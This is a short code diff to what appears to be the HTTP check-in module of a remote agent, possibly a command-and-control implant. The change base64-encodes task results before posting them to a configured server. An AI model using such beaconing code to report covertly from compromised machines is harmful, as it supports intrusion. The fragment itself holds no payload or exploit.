@@ -34,7 +34,8 @@ class HTTPCommunicationModule(CommunicationModule):
 
     def checkin(self) -> str | None:
         results = [result.to_dict() for result in self.agent.get_results()]
-        response = requests.post(f"http://{self.address}:{self.port}/", headers=self.headers, data=json.dumps({"results": results}))
+        encoded_results = base64.b64encode(json.dumps(results).encode()).decode()
+        response = requests.post(f"http://{self.address}:{self.port}/", headers=self.headers, data=json.dumps({"results": encoded_results}))
         print(response.text)
         if response.status_code == 200 or response.status_code == 201:
             data = response.json()
